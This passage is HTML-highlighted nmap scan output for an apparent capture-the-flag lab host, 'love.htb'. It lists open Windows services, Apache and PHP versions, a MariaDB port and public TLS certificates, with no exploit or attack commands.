<span class="mi">139</span><span class="o">/</span><span class="n">tcp</span>   <span class="n">open</span>  <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>  <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>
<span class="mi">443</span><span class="o">/</span><span class="n">tcp</span>   <span class="n">open</span>  <span class="n">ssl</span><span class="o">/</span><span class="n">http</span>     <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">Apache</span> <span class="n">httpd</span> <span class="mf">2.4.46</span> <span class="p">(</span><span class="n">OpenSSL</span><span class="o">/</span><span class="mf">1.1.1</span><span class="n">j</span> <span class="n">PHP</span><span class="o">/</span><span class="mf">7.3.27</span><span class="p">)</span>
<span class="o">|</span> <span class="n">http</span><span class="o">-</span><span class="n">methods</span><span class="o">:</span> 
<span class="o">|</span><span class="n">_</span>  <span class="n">Supported</span> <span class="n">Methods</span><span class="o">:</span> <span class="n">HEAD</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="o">:</span> <span class="n">Apache</span><span class="o">/</span><span class="mf">2.4.46</span> <span class="p">(</span><span class="n">Win64</span><span class="p">)</span> <span class="n">OpenSSL</span><span class="o">/</span><span class="mf">1.1.1</span><span class="n">j</span> <span class="n">PHP</span><span class="o">/</span><span class="mf">7.3.27</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="o">:</span> <span class="mi">403</span> <span class="n">Forbidden</span>
<span class="o">|</span> <span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="o">:</span> <span class="n">Subject</span><span class="o">:</span> <span class="n">commonName</span><span class="o">=</span><span class="n">staging</span><span class="p">.</span><span class="n">love</span><span class="p">.</span><span class="n">htb</span><span class="o">/</span><span class="n">organizationName</span><span class="o">=</span><span class="n">ValentineCorp</span><span class="o">/</span><span class="n">stateOrProvinceName</span><span class="o">=</span><span class="n">m</span><span class="o">/</span><span class="n">countryName</span><span class="o">=</span><span class="n">in</span><span class="o">/</span><span class="n">localityName</span><span class="o">=</span><span class="n">norway</span><span class="o">/</span><span class="n">organizationalUnitName</span><span class="o">=</span><span class="n">love</span><span class="p">.</span><span class="n">htb</span><span class="o">/</span><span class="n">emailAddress</span><span class="o">=</span><span class="n">roy</span><span class="err">@</span><span class="n">love</span><span class="p">.</span><span class="n">htb</span>
<span class="o">|</span> <span class="n">Issuer</span><span class="o">:</span> <span class="n">commonName</span><span class="o">=</span><span class="n">staging</span><span class="p">.</span><span class="n">love</span><span class="p">.</span><span class="n">htb</span><span class="o">/</span><span class="n">organizationName</span><span class="o">=</span><span class="n">ValentineCorp</span><span class="o">/</span><span class="n">stateOrProvinceName</span><span class="o">=</span><span class="n">m</span><span class="o">/</span><span class="n">countryName</span><span class="o">=</span><span class="n">in</span><span class="o">/</span><span class="n">localityName</span><span class="o">=</span><span class="n">norway</span><span class="o">/</span><span class="n">organizationalUnitName</span><span class="o">=</span><span class="n">love</span><span class="p">.</span><span class="n">htb</span><span class="o">/</span><span class="n">emailAddress</span><span class="o">=</span><span class="n">roy</span><span class="err">@</span><span class="n">love</span><span class="p">.</span><span class="n">htb</span>
<span class="o">|</span> <span class="n">Public</span> <span class="n">Key</span> <span class="n">type</span><span class="o">:</span> <span class="n">rsa</span>
<span class="o">|</span> <span class="n">Public</span> <span class="n">Key</span> <span class="n">bits</span><span class="o">:</span> <span class="mi">2048</span>
<span class="o">|</span> <span class="n">Signature</span> <span class="n">Algorithm</span><span class="o">:</span> <span class="n">sha256WithRSAEncryption</span>
<span class="o">|</span> <span class="n">Not</span> <span class="n">valid</span> <span class="n">before</span><span class="o">:</span> <span class="mi">2021</span><span class="o">-</span><span class="mo">01</span><span class="o">-</span><span class="mi">18</span><span class="n">T14</span><span class="o">:</span><span class="mo">00</span><span class="o">:</span><span class="mi">16</span>
<span class="o">|</span> <span class="n">Not</span> <span class="n">valid</span> <span class="n">after</span><span class="o">:</span>  <span class="mi">2022</span><span class="o">-</span><span class="mo">01</span><span class="o">-</span><span class="mi">18</span><span class="n">T14</span><span class="o">:</span><span class="mo">00</span><span class="o">:</span><span class="mi">16</span>
<span class="o">|</span> <span class="n">MD5</span><span class="o">:</span>   <span class="n">bff0</span> <span class="mi">1</span><span class="n">add</span> <span class="mi">5048</span> <span class="n">afc8</span> <span class="n">b3cf</span> <span class="mi">7140</span> <span class="mf">6e68</span> <span class="mi">5</span><span class="n">ff6</span>
<span class="o">|</span> <span class="n">SHA</span><span class="o">-</span><span class="mi">1</span><span class="o">:</span> <span class="mi">83</span><span class="n">ed</span> <span class="mi">29</span><span class="n">c4</span> <span class="mi">70</span><span class="n">f6</span> <span class="mi">4036</span> <span class="n">a6f4</span> <span class="mi">2</span><span class="n">d4d</span> <span class="mi">4</span><span class="n">cf6</span> <span class="mi">18</span><span class="n">a2</span> <span class="n">e9e4</span> <span class="mi">96</span><span class="n">c2</span>
<span class="o">|</span> <span class="o">-----</span><span class="n">BEGIN</span> <span class="n">CERTIFICATE</span><span class="o">-----</span>
<span class="o">|</span> <span class="n">MIIDozCCAosCFFhDHcnclWJmeuqOK</span><span class="o">/</span><span class="n">LQv3XDNEu4MA0GCSqGSIb3DQEBCwUAMIGN</span>
<span class="o">|</span> <span class="n">MQswCQYDVQQGEwJpbjEKMAgGA1UECAwBbTEPMA0GA1UEBwwGbm9yd2F5MRYwFAYD</span>
<span class="o">|</span> <span class="n">VQQKDA1WYWxlbnRpbmVDb3JwMREwDwYDVQQLDAhsb3ZlLmh0YjEZMBcGA1UEAwwQ</span>
<span class="o">|</span> <span class="n">c3RhZ2luZy5sb3ZlLmh0YjEbMBkGCSqGSIb3DQEJARYMcm95QGxvdmUuaHRiMB4X</span>
<span class="o">|</span> <span class="n">DTIxMDExODE0MDAxNloXDTIyMDExODE0MDAxNlowgY0xCzAJBgNVBAYTAmluMQow</span>
<span class="o">|</span> <span class="n">CAYDVQQIDAFtMQ8wDQYDVQQHDAZub3J3YXkxFjAUBgNVBAoMDVZhbGVudGluZUNv</span>
<span class="o">|</span> <span class="n">cnAxETAPBgNVBAsMCGxvdmUuaHRiMRkwFwYDVQQDDBBzdGFnaW5nLmxvdmUuaHRi</span>
<span class="o">|</span> <span class="n">MRswGQYJKoZIhvcNAQkBFgxyb3lAbG92ZS5odGIwggEiMA0GCSqGSIb3DQEBAQUA</span>
<span class="o">|</span> <span class="n">A4IBDwAwggEKAoIBAQDQlH1J</span><span class="o">/</span><span class="n">AwbEm2Hnh4Bizch08sUHlHg7vAMGEB14LPq9G20</span>
<span class="o">|</span> <span class="n">PL</span><span class="o">/</span><span class="mi">6</span><span class="n">QmYxJOWBPjBWWywNYK3cPIFY8yUmYlLBiVI0piRfaSj7wTLW3GFSPhrpmfz0</span>
<span class="o">|</span> <span class="mi">0</span><span class="n">zJMKeyBOD0</span><span class="o">+</span><span class="mi">1</span><span class="n">K9BxiUQNVyEnihsULZKLmZcF6LhOIhiONEL6mKKr2</span><span class="o">/</span><span class="n">mHLgfoR7U</span>
<span class="o">|</span> <span class="n">vM7OmmywdLRgLfXN2Cgpkv7ciEARU0phRq2p1s4W9Hn3XEU8iVqgfFXs</span><span class="o">/</span><span class="n">ZNyX3r8</span>
<span class="o">|</span> <span class="n">LtDiQUavwn2s</span><span class="o">+</span><span class="n">Hta0mslI0waTmyOsNrE4wgcdcF9kLK</span><span class="o">/</span><span class="mi">9</span><span class="n">ttM1ugTJSQAQWbYo5LD</span>
<span class="o">|</span> <span class="mi">2</span><span class="n">bVw7JidPhX8mELviftIv5W1LguCb3uVb6ipfShxAgMBAAEwDQYJKoZIhvcNAQEL</span>
<span class="o">|</span> <span class="n">BQADggEBANB5x2U0QuQdc9niiW8XtGVqlUZOpmToxstBm4r0Djdqv</span><span class="o">/</span><span class="n">Z73I</span><span class="o">/</span><span class="n">qys0A</span>
<span class="o">|</span> <span class="n">y7crcy9dRO7M80Dnvj0ReGxoWN</span><span class="o">/</span><span class="mi">95</span><span class="n">ZA4GSL8TUfIfXbonrCKFiXOOuS8jCzC9LWE</span>
<span class="o">|</span> <span class="n">nP4jUUlAOJv6uYDajoD3NfbhW8uBvopO</span><span class="o">+</span><span class="mi">8</span><span class="n">nywbQdiffatKO35McSl7ukvIK</span><span class="o">+</span><span class="n">d7gz</span>
<span class="o">|</span> <span class="n">oool</span><span class="o">/</span><span class="n">rMp</span><span class="o">/</span><span class="n">fQ40A1nxVHeLPOexyB3YJIMAhm4NexfJ2TKxs10C</span><span class="o">+</span><span class="n">lJcuOxt7MhOk0h</span>
<span class="o">|</span> <span class="n">zSPL</span><span class="o">/</span><span class="n">pMbMouLTXnIsh4SdJEzEkNnuO69yQoN8XgjM7vHvZQIlzs1R5pk4WIgKHSZ</span>
<span class="o">|</span> <span class="mi">0</span><span class="n">drwvFE50xML9h2wrGh7L9</span><span class="o">/</span><span class="n">CSbhIhO8</span><span class="o">=</span>
<span class="o">|</span><span class="n">_</span><span class="o">-----</span><span class="n">END</span> <span class="n">CERTIFICATE</span><span class="o">-----</span>
<span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="n">date</span><span class="o">:</span> <span class="n">TLS</span> <span class="n">randomness</span> <span class="n">does</span> <span class="n">not</span> <span class="n">represent</span> <span class="n">time</span>
<span class="o">|</span> <span class="n">tls</span><span class="o">-</span><span class="n">alpn</span><span class="o">:</span> 
<span class="o">|</span><span class="n">_</span>  <span class="n">http</span><span class="o">/</span><span class="mf">1.1</span>
<span class="mi">445</span><span class="o">/</span><span class="n">tcp</span>   <span class="n">open</span>  <span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span> <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">Windows</span> <span class="mi">10</span> <span class="n">Pro</span> <span class="mi">19042</span> <span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span> <span class="p">(</span><span class="n">workgroup</span><span class="o">:</span> <span class="n">WORKGROUP</span><span class="p">)</span>
<span class="mi">3306</span><span class="o">/</span><span class="n">tcp</span>  <span class="n">open</span>  <span class="n">mysql</span><span class="o">?</span>       <span class="n">syn</span><span class="o">-</span><span class="n">ack</span>
<span class="o">|</span> <span class="n">fingerprint</span><span class="o">-</span><span class="n">strings</span><span class="o">:</span> 
<span class="o">|</span>   <span class="nb">NULL</span><span class="p">,</span> <span class="n">WMSRequest</span><span class="o">:</span> 
<span class="o">|</span><span class="n">_</span>    <span class="n">Host</span> <span class="err">'</span><span class="mf">10.10.14.126</span><span class="err">'</span> <span class="n">is</span> <span class="n">not</span> <span class="n">allowed</span> <span class="n">to</span> <span class="n">connect</span> <span class="n">to</span> <span class="k">this</span> <span class="n">MariaDB</span> <span class="n">server</span>
<span class="o">|</span> <span class="n">mysql</span><span class="o">-</span><span class="n">info</span><span class="o">:</span> 
<span class="o">|</span><span class="n">_</span>  <span class="n">MySQL</span> <span class="n">Error</span><span class="o">:</span> <span class="n">Host</span> <span class="err">'</span><span class="mf">10.10.14.126</span><span class="err">'</span> <span class="n">is</span> <span class="n">not</span> <span class="n">allowed</span> <span class="n">to</span> <span class="n">connect</span> <span class="n">to</span> <span class="k">this</span> <span class="n">MariaDB</span> <span class="n">server</span>
<span class="mi">5000</span><span class="o">/</span><span class="n">tcp</span>  <span class="n">open</span>  <span class="n">http</span>         <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">Apache</span> <span class="n">httpd</span> <span class="mf">2.4.46</span> <span class="p">(</span><span class="n">OpenSSL</span><span class="o">/</span><span class="mf">1.1.1</span><span class="n">j</span> <span class="n">PHP</span><span class="o">/</span><span class="mf">7.3.27</span><span class="p">)</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="o">:</span> <span class="n">Apache</span><span class="o">/</span><span class="mf">2.4.46</span> <span class="p">(</span><span class="n">Win64</span><span class="p">)</span> <span class="n">OpenSSL</span><span class="o">/</span><span class="mf">1.1.1</span><span class="n">j</span> <span class="n">PHP</span><span class="o">/</span><span class="mf">7.3.27</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="o">:</span> <span class="mi">403</span> <span class="n">Forbidden</span>
<span class="mi">5040</span><span class="o">/</span><span class="n">tcp</span>  <span class="n">open</span>  <span class="n">unknown</span>      <span class="n">syn</span><span class="o">-</span><span class="n">ack</span>
<span class="mi">5985</span><span class="o">/</span><span class="n">tcp</span>  <span class="n">open</span>  <span class="n">http</span>         <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">Microsoft</span> <span class="n">HTTPAPI</span> <span class="n">httpd</span> <span class="mf">2.0</span> <span class="p">(</span><span class="n">SSDP</span><span class="o">/</span><span class="n">UPnP</span><span class="p">)</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="o">:</span> <span class="n">Microsoft</span><span class="o">-</span><span class="n">HTTPAPI</span><span class="o">/</span><span class="mf">2.0</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="o">:</span> <span class="n">Not</span> <span class="n">Found</span>
<span class="mi">5986</span><span class="o">/</span><span class="n">tcp</span>  <span class="n">open</span>  <span class="n">ssl</span><span class="o">/</span><span class="n">http</span>     <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">Microsoft</span> <span class="n">HTTPAPI</span> <span class="n">httpd</span> <span class="mf">2.0</span> <span class="p">(</span><span class="n">SSDP</span><span class="o">/</span><span class="n">UPnP</span><span class="p">)</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="o">:</span> <span class="n">Microsoft</span><span class="o">-</span><span class="n">HTTPAPI</span><span class="o">/</span><span class="mf">2.0</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="o">:</span> <span class="n">Not</span> <span class="n">Found</span>
<span class="o">|</span> <span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="o">:</span> <span class="n">Subject</span><span class="o">:</span> <span class="n">commonName</span><span class="o">=</span><span class="n">LOVE</span>
<span class="o">|</span> <span class="n">Subject</span> <span class="n">Alternative</span> <span class="n">Name</span><span class="o">:</span> <span class="n">DNS</span><span class="o">:</span><span class="n">LOVE</span><span class="p">,</span> <span class="n">DNS</span><span class="o">:</span><span class="n">Love</span>
<span class="o">|</span> <span class="n">Issuer</span><span class="o">:</span> <span class="n">commonName</span><span class="o">=</span><span class="n">LOVE</span>
<span class="o">|</span> <span class="n">Public</span> <span class="n">Key</span> <span class="n">type</span><span class="o">:</span> <span class="n">rsa</span>
<span class="o">|</span> <span class="n">Public</span> <span class="n">Key</span> <span class="n">bits</span><span class="o">:</span> <span class="mi">4096</span>
<span class="o">|</span> <span class="n">Signature</span> <span class="n">Algorithm</span><span class="o">:</span> <span class="n">sha256WithRSAEncryption</span>
<span class="o">|</span> <span class="n">Not</span> <span class="n">valid</span> <span class="n">before</span><span class="o">:</span> <span class="mi">2021</span><span class="o">-</span><span class="mo">04</span><span class="o">-</span><span class="mi">11</span><span class="n">T14</span><span class="o">:</span><span class="mi">39</span><span class="o">:</span><span class="mi">19</span>
<span class="o">|</span> <span class="n">Not</span> <span class="n">valid</span> <span class="n">after</span><span class="o">:</span>  <span class="mi">2024</span><span class="o">-</span><span class="mo">04</span><span class="o">-</span><span class="mi">10</span><span class="n">T14</span><span class="o">:</span><span class="mi">39</span><span class="o">:</span><span class="mi">19</span>
<span class="o">|</span> <span class="n">MD5</span><span class="o">:</span>   <span class="n">d35a</span> <span class="mi">2</span><span class="n">ba6</span> <span class="mi">8</span><span class="n">ef4</span> <span class="mi">7568</span> <span class="n">f99d</span> <span class="n">d6f4</span> <span class="n">aaa2</span> <span class="mo">03</span><span class="n">b5</span>
<span class="o">|</span> <span class="n">SHA</span><span class="o">-</span><span class="mi">1</span><span class="o">:</span> <span class="mi">84</span><span class="n">ef</span> <span class="n">d922</span> <span class="n">a70a</span> <span class="mi">6</span><span class="n">d9d</span> <span class="mi">82</span><span class="n">b8</span> <span class="mi">5</span><span class="n">bb3</span> <span class="n">d04f</span> <span class="mo">066</span><span class="n">b</span> <span class="mi">12</span><span class="n">f8</span> <span class="mf">6e73</span>
<span class="o">|</span> <span class="o">-----</span><span class="n">BEGIN</span> <span class="n">CERTIFICATE</span><span class="o">-----</span>
<span class="o">|</span> <span class="n">MIIFBTCCAu2gAwIBAgIQQD</span><span class="o">+</span><span class="n">VWjjYeaVAiweoWrOJXjANBgkqhkiG9w0BAQsFADAP</span>
<span class="o">|</span> <span class="n">MQ0wCwYDVQQDDARMT1ZFMB4XDTIxMDQxMTE0MzkxOVoXDTI0MDQxMDE0MzkxOVow</span>
<span class="o">|</span> <span class="n">DzENMAsGA1UEAwwETE9WRTCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIB</span>
<span class="o">|</span> <span class="n">APC54</span><span class="o">+</span><span class="n">VMM</span><span class="o">+</span><span class="n">g9yynvO9x5UWpskpl8oxYcplv</span><span class="o">/</span><span class="n">zck10LeamyoRMCoOb6</span><span class="o">+</span><span class="n">lPhokbydf</span>
<span class="o">|</span> <span class="mi">1</span><span class="n">cj</span><span class="o">/</span><span class="n">td1WjOoCkE22w8KBXt</span><span class="o">+</span><span class="n">GkBtYp1AuaiQuUWZbSU1TfKLgGTB</span><span class="o">+</span><span class="n">jqcn6L8oFdpm</span>
<span class="o">|</span> <span class="n">MMl1rdgW</span><span class="o">/</span><span class="n">dDLF4WRSgPd1bwSl1JrgM2ETbQNbuE</span><span class="o">+</span><span class="n">pPkUAOwQp9W2</span><span class="o">/</span><span class="n">YcSCPAc</span><span class="o">+</span><span class="n">a03</span>
<span class="o">|</span> <span class="n">bntUxAyVe</span><span class="o">/</span><span class="n">U4xm9GJYTliUGZCc4KY74ZhiIoE9N</span><span class="o">+</span><span class="n">qW9wH</span><span class="o">+</span><span class="n">THyTcKYFo6acCYK3OT</span>
<span class="o">|</span> <span class="n">NFxj2NVB34YSOaGwoJDfHOdt6q8hQSBk2MLcIlFMYpzyk6guxO6CYucufqPUhux8</span>
<span class="o">|</span> <span class="n">j8foDhPOQr4eg8L2WZq0mF2k0Owt</span><span class="o">+</span><span class="n">FPaFCQpq8Cuk3wxkrkHAlwzmxMjZUhO59Z7</span>
<span class="o">|</span> <span class="n">p7cSQt5JtDrSIghP9nePFkz1ARaUE4ifUfWb7ZhX5ZI2sWD7y5ilgK</span><span class="o">/+</span><span class="n">EJRUs8Qr</span>
<span class="o">|</span> <span class="n">aiNJQhr2W</span><span class="o">+</span><span class="n">Lu8Q8C821LrhQ8srRbV3APlj0jysYzTcerksSmA4L2NYEjdYuIkHNh</span>
<span class="o">|</span> <span class="n">VH7IUwAfyQCKhT9Z4l9TMmu0w84jvFV</span><span class="o">/</span><span class="n">e4PYrXe7W3jNquKI8</span><span class="o">+</span><span class="n">FvgAtj7crDkX6x</span>
<span class="o">|</span> <span class="n">ouN13d3Z12FsPFZB8S9cFhEnMUT0VcPqx4on6oD1</span><span class="o">+</span><span class="n">iD3dkPYi907kHjvHQqc43yZ</span>
<span class="o">|</span> <span class="n">vRSJBNy12LsX9bDyeew1jWBLqhdh0fApp</span><span class="o">+</span><span class="mi">5L</span><span class="n">SKyEanENAgMBAAGjXTBbMA4GA1Ud</span>
<span class="o">|</span> <span class="n">DwEB</span><span class="o">/</span><span class="n">wQEAwIFoDATBgNVHSUEDDAKBggrBgEFBQcDATAVBgNVHREEDjAMggRMT1ZF</span>
<span class="o">|</span> <span class="n">ggRMb3ZlMB0GA1UdDgQWBBQNJyWWYTVg7yDEB8RiCpGkBlLzcjANBgkqhkiG9w0B</span>
<span class="o">|</span> <span class="n">AQsFAAOCAgEAOtD1tPlQAsAozmZxFGc7PiMkJpZbpS31Hb32</span><span class="o">/</span><span class="n">aFwTxeN</span><span class="o">/</span><span class="mi">7</span><span class="n">VEmTPM</span>
<span class="o">|</span> <span class="o">+</span><span class="n">FyIo</span><span class="o">+</span><span class="n">ZxgL</span><span class="o">+</span><span class="n">GD6SGWtpunCGs2Hms3lbSxnPNPbdcaG6whP12Ih</span><span class="o">/</span><span class="n">xGuQEbXVq6uY3</span>
<span class="o">|</span> <span class="n">fmCL</span><span class="o">/</span><span class="n">zIHthIjDPbgvtrC0xB</span><span class="o">/</span><span class="mi">1</span><span class="n">kioMrDdGK1jp1F9q1cd</span><span class="o">+</span><span class="mi">9</span><span class="n">P3cTPXgpekTzcFixGF</span>
<span class="o">|</span> <span class="n">BkQTM0ty8FjZnwTYwtAJ7RcxbzhIGi4YlJGIBOi98XvParnR2co2XhR</span><span class="o">+</span><span class="n">gBBPhppC</span>
<span class="o">|</span> <span class="mi">0</span><span class="n">zKscOXtQrOyWymrq1XSEdFhExznQREXkGsUX9Ogw8yTdREt9jdlijjtQGISBlwG</span>
<span class="o">|</span> <span class="mi">807</span><span class="n">Ru8m6HeO35dhUp3fS1ZOQ94Zlmls8Uw4F0slQ5v44rhhbOziy3fcb63zSvFJ1</span>
<span class="o">|</span> <span class="n">jzk5yEoxER7tMiWrxCniGSI7kIs0ACGEWHbsbjfQuGVvTe2S</span><span class="o">/</span><span class="n">yBmUbCSuZPS9r1X</span>
<span class="o">|</span> <span class="n">w3EPapovLDMmx8PBLMXDa75bBE</span><span class="o">+</span><span class="n">si</span><span class="o">/</span><span class="mi">3</span><span class="n">xS4w8OIepTrk</span><span class="o">+</span><span class="n">oajAWPjHSFrt6QRRI9Mv</span>
<span class="o">|</span> <span class="n">L1UEoxV1K7amnTybXb66kpvucZz0pQYVuRypOYLlFuFMC2vj8M</span><span class="o">/</span><span class="mi">64</span><span class="n">Hfb5OhFG</span><span class="o">+</span><span class="mi">6</span><span class="n">p</span>
<span class="o">|</span> <span class="n">RtFRdYl9s</span><span class="o">/</span><span class="n">H</span><span class="o">+</span><span class="n">R</span><span class="o">+</span><span class="n">Y</span><span class="o">+</span><span class="n">fB4o9Tf5vMpYwOCrBfTEGvm4JLBRGXn6f0ODcGqwVYVWyPEo</span>
<span class="o">|</span> <span class="mi">4</span><span class="n">pv8jZSiNJsmm6gsQXR4fLIPGuNjwmxJmm51Itv0Lb</span><span class="o">+</span><span class="n">FQogRk</span><span class="o">/</span><span class="mi">9</span><span class="n">I0AI</span><span class="o">=</span>
<span class="o">|</span><span class="n">_</span><span class="o">-----</span><span class="n">END</span> <span class="n">CERTIFICATE</span><span class="o">-----</span>
<span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="n">date</span><span class="o">:</span> <span class="mi">2021</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">09</span><span class="n">T15</span><span class="o">:</span><span class="mi">12</span><span class="o">:</span><span class="mi">30</span><span class="o">+</span><span class="mo">00</span><span class="o">:</span><span class="mo">00</span><span class="p">;</span> <span class="o">+</span><span class="mi">20</span><span class="n">m58s</span> <span class="n">from</span> <span class="n">scanner</span> <span class="n">time</span><span class="p">.</span>
<span class="o">|</span> <span class="n">tls</span><span class="o">-</span><span class="n">alpn</span><span class="o">:</span> 
<span class="o">|</span><span class="n">_</span>  <span class="n">http</span><span class="o">/</span><span class="mf">1.1</span>
<span class="mi">7680</span><span class="o">/</span><span class="n">tcp</span>  <span class="n">open</span>  <span class="n">pando</span><span class="o">-</span><span class="n">pub</span><span class="o">?</span>   <span class="n">syn</span><span class="o">-</span><span class="n">ack</span>
<span class="mi">47001</span><span class="o">/</span><span class="n">tcp</span> <span class="n">open</span>  <span class="n">http</span>         <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">Microsoft</span> <span class="n">HTTPAPI</span> <span class="n">httpd</span> <span class="mf">2.0</span> <span class="p">(</span><span class="n">SSDP</span><span class="o">/</span><span class="n">UPnP</span><span class="p">)</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="o">:</span> <span class="n">Microsoft</span><span class="o">-</span><span class="n">HTTPAPI</span><span class="o">/</span><span class="mf">2.0</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="o">:</span> <span class="n">Not</span> <span class="n">Found</span>
<span class="mi">49664</span><span class="o">/</span><span class="n">tcp</span> <span class="n">open</span>  <span class="n">msrpc</span>        <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
<span class="mi">49665</span><span class="o">/</span><span class="n">tcp</span> <span class="n">open</span>  <span class="n">msrpc</span>        <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
<span class="mi">49666</span><span class="o">/</span><span class="n">tcp</span> <span class="n">open</span>  <span class="n">msrpc</span>        <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
<span class="mi">49667</span><span class="o">/</span><span class="n">tcp</span> <span class="n">open</span>  <span class="n">msrpc</span>        <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
<span class="mi">49668</span><span class="o">/</span><span class="n">tcp</span> <span class="n">open</span>  <span class="n">msrpc</span>        <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
<span class="mi">49669</span><span class="o">/</span><span class="n">tcp</span> <span class="n">open</span>  <span class="n">msrpc</span>        <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
<span class="mi">49670</span><span class="o">/</span><span class="n">tcp</span> <span class="n">open</span>  <span class="n">msrpc</span>        <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
<span class="mi">1</span> <span class="n">service</span> <span class="n">unrecognized</span> <span class="n">despite</span> <span class="n">returning</span> <span class="n">data</span><span class="p">.</span> <span class="n">If</span> <span class="n">you</span> <span class="n">know</span> <span class="n">the</span> <span class="n">service</span><span class="o">/</span><span class="n">version</span><span class="p">,</span> <span class="n">please</span> <span class="n">submit</span> <span class="n">the</span> <span class="n">following</span> <span class="n">fingerprint</span> <span class="n">at</span> <span class="n">https</span><span class="o">:</span><span class="c1">//nmap.org/cgi-bin/submit.cgi?new-service :</span>
<span class="n">SF</span><span class="o">-</span><span class="n">Port3306</span><span class="o">-</span><span class="n">TCP</span><span class="o">:</span><span class="n">V</span><span class="o">=</span><span class="mf">7.91</span><span class="o">%</span><span class="n">I</span><span class="o">=</span><span class="mi">7</span><span class="o">%</span><span class="n">D</span><span class="o">=</span><span class="mi">8</span><span class="o">/</span><span class="mi">9</span><span class="o">%</span><span class="n">Time</span><span class="o">=</span><span class="mi">6111400</span><span class="n">A</span><span class="o">%</span><span class="n">P</span><span class="o">=</span><span class="n">x86_64</span><span class="o">-</span><span class="n">unknown</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">%</span>
<span class="n">SF</span><span class="o">:</span><span class="n">r</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="mi">4</span><span class="n">B</span><span class="p">,</span><span class="s">"G</span><span class="se">\0\0\x01\xff</span><span class="s">j</span><span class="se">\x04</span><span class="s">Host</span><span class="se">\x20</span><span class="s">'10\.10\.14\.126'</span><span class="se">\x20</span><span class="s">is</span><span class="se">\x20</span><span class="s">not</span><span class="se">\x20</span><span class="err">
</span><span class="s">SF:allowed</span><span class="se">\x20</span><span class="s">to</span><span class="se">\x20c</span><span class="s">onnect</span><span class="se">\x20</span><span class="s">to</span><span class="se">\x20</span><span class="s">this</span><span class="se">\x20</span><span class="s">MariaDB</span><span class="se">\x20</span><span class="s">server"</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">WMSRequ</span>
<span class="n">SF</span><span class="o">:</span><span class="n">est</span><span class="p">,</span><span class="mi">4</span><span class="n">B</span><span class="p">,</span><span class="s">"G</span><span class="se">\0\0\x01\xff</span><span class="s">j</span><span class="se">\x04</span><span class="s">Host</span><span class="se">\x20</span><span class="s">'10\.10\.14\.126'</span><span class="se">\x20</span><span class="s">is</span><span class="se">\x20</span><span class="s">not</span><span class="se">\x20a</span><span class="s">ll</span><span class="err">
</span><span class="s">SF:owed</span><span class="se">\x20</span><span class="s">to</span><span class="se">\x20c</span><span class="s">onnect</span><span class="se">\x20</span><span class="s">to</span><span class="se">\x20</span><span class="s">this</span><span class="se">\x20</span><span class="s">MariaDB</span><span class="se">\x20</span><span class="s">server"</span><span class="p">);</span>
<span class="n">Service</span> <span class="n">Info</span><span class="o">:</span> <span class="n">Hosts</span><span class="o">:</span> <span class="n">www</span><span class="p">.</span><span class="n">example</span><span class="p">.</span><span class="n">com</span><span class="p">,</span> <span class="n">LOVE</span><span class="p">,</span> <span class="n">www</span><span class="p">.</span><span class="n">love</span><span class="p">.</span><span class="n">htb</span><span class="p">;</span> <span class="n">OS</span><span class="o">:</span> <span class="n">Windows</span><span class="p">;</span> <span class="n">CPE</span><span class="o">:</span> <span class="n">cpe</span><span class="o">:/</span><span class="n">o</span><span class="o">:</span><span class="n">microsoft</span><span class="o">:</span><span class="n">windows</span>

<span class="n">Host</span> <span class="n">script</span> <span class="n">results</span><span class="o">:</span>
